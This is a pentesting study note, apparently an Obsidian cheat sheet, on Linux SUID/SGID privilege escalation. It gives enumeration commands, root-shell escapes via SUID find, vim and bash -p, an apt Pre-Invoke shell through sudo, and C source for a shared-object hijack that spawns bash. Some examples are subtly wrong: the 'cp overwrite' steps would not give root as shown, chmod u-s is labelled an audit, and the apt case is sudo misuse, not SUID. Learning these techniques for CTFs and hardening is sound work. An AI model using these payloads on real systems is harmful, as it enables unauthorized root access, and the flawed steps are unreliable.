## Overview

Linux supports **special permission bits** that modify how executables run.

The most important for privilege escalation:

| Permission | Effect |
|------------|--------|
| **SUID (Set User ID)** | program runs with the privileges of the file owner |
| **SGID (Set Group ID)** | program runs with the privileges of the file group |
| **Sticky Bit** | restricts file deletion to file owner |

SUID/SGID are commonly required for legitimate functionality (e.g. changing passwords), but misconfigurations or vulnerable binaries can allow attackers to escalate privileges.

---

# Understanding SUID

When the **SUID bit** is set on a binary, the program executes with the privileges of the file owner rather than the current user.

Example:

```bash
-rwsr-xr-x 1 root root 40128 May 17 2017 /bin/su
```

Notice:

```text
rws
```

The **s** replaces the executable bit:

| Permission | Meaning |
|------------|---------|
| rws | read, write, execute as owner |
| r-x | read & execute for group |
| r-x | read & execute for others |

This means:

```bash
/bin/su
```

runs with **root privileges**.

---

# Enumerating SUID Binaries

Search system-wide:

```bash
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

Example output:

```text
-rwsr-xr-x 1 root root 40152 /bin/mount
-rwsr-xr-x 1 root root 40128 /bin/su
-rwsr-xr-x 1 root root 136808 /usr/bin/sudo
-rwsr-xr-x 1 root root 1588768 /usr/bin/screen-4.5.0
-rwsr-xr-x 1 root root 23376 /usr/bin/pkexec
```

---

# Understanding SGID

The **SGID bit** allows execution with the permissions of the owning group.

Example:

```bash
-rwsr-sr-x 1 root root /usr/lib/snapd/snap-confine
```

Enumerate SGID binaries:

```bash
find / -user root -perm -6000 -type f 2>/dev/null
```

---

# Why SUID/SGID Are Dangerous

If a privileged binary:

- executes system commands
- calls external programs
- loads shared libraries
- processes user input
- allows file writes
- allows shell execution

then it may allow privilege escalation.

---

# Identifying Vulnerable SUID Binaries

Common high-value targets:

| Binary | Risk |
|--------|------|
| sudo | misconfigurations |
| pkexec | historical CVEs |
| find | command execution |
| vim | shell escape |
| less | shell escape |
| bash | privilege inheritance |
| cp | file overwrite |
| nano | shell execution |
| nmap | interactive shell mode |
| screen | privilege inheritance |
| tar | wildcard abuse |
| python | shell spawn |

---

# Using GTFOBins

GTFOBins is a curated database of binaries that can be abused for:

- privilege escalation
- shell escapes
- reverse shells
- file read/write
- command execution

Reference:

https://gtfobins.github.io

---

# Example Exploitation – find

If `find` has SUID bit:

```bash
find . -exec /bin/sh \; -quit
```

Spawn root shell.

---

# Example Exploitation – vim

If vim has SUID:

```bash
vim test.txt
```

Inside vim:

```vim
:! /bin/sh
```

---

# Example Exploitation – bash

If bash has SUID:

```bash
bash -p
```

`-p` preserves privileges.

---

# Example Exploitation – cp overwrite

Overwrite protected files:

```bash
cp /bin/bash /tmp/bash
chmod +s /tmp/bash
/tmp/bash -p
```

---

# Example Exploitation – apt

APT allows pre-invoke command execution:

```bash
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

Check privileges:

```bash
id
```

Output:

```text
uid=0(root) gid=0(root)
```

---

# Detecting Custom SUID Binaries

Non-standard locations often indicate custom applications:

Example:

```text
/home/mrb3n/payroll
/home/htb-student/shared_obj_hijack/payroll
```

Custom binaries often contain:

- insecure library loading
- relative path execution
- unsafe system() calls
- PATH vulnerabilities
- weak file permissions

Analyse binary:

```bash
strings binary
ltrace binary
strace binary
ldd binary
file binary
```

---

# Shared Object Hijacking

If binary loads libraries from writable directories:

```bash
ldd payroll
```

Look for:

```text
libshared.so => not found
```

Create malicious library:

```c
#include <stdio.h>
#include <stdlib.h>

void _init() {
    system("/bin/bash");
}
```

Compile:

```bash
gcc -shared -fPIC -o libshared.so exploit.c
```

Execute vulnerable binary to spawn shell.

---

# Identifying SUID Abuse Opportunities

Checklist:

## Enumerate SUID files

```bash
find / -perm -4000 -type f 2>/dev/null
```

---

## Enumerate SGID files

```bash
find / -perm -2000 -type f 2>/dev/null
```

---

## Check file permissions

```bash
ls -la binary
```

---

## Identify unusual binaries

```bash
file binary
strings binary
```

---

## Check linked libraries

```bash
ldd binary
```

---

## Trace execution

```bash
strace binary
```

---

# Sticky Bit Overview

Sticky bit commonly appears on shared directories:

```bash
drwxrwxrwt  tmp
```

Effect:

users cannot delete files owned by other users.

Example:

```bash
/tmp
```

---

# Defensive Mitigations

System hardening should include:

- minimize SUID binaries
- remove unnecessary SUID bits
- restrict writable directories
- monitor unusual SUID binaries
- patch vulnerable packages
- restrict execution permissions
- audit custom binaries
- apply least privilege principle

Audit SUID files:

```bash
chmod u-s binary
```

---

# Quick SUID Enumeration Cheatsheet

```bash
find / -perm -4000 -type f 2>/dev/null

find / -perm -2000 -type f 2>/dev/null

find / -user root -perm -4000 2>/dev/null

find / -perm -u=s -type f 2>/dev/null
```

---

# Key Takeaways

- SUID executes binaries with owner privileges
- SGID executes binaries with group privileges
- misconfigured SUID binaries are common privilege escalation vectors
- GTFOBins is critical reference resource
- custom binaries present highest risk
- shared object hijacking is common technique
- enumeration should always include SUID search
- many privilege escalation paths rely on insecure binary permissions

---

# Tags

#linux
#privilege-escalation
#suid
#sgid
#gtfobins
#post-exploitation
#enumeration
#ctf
#pentesting
#obsidian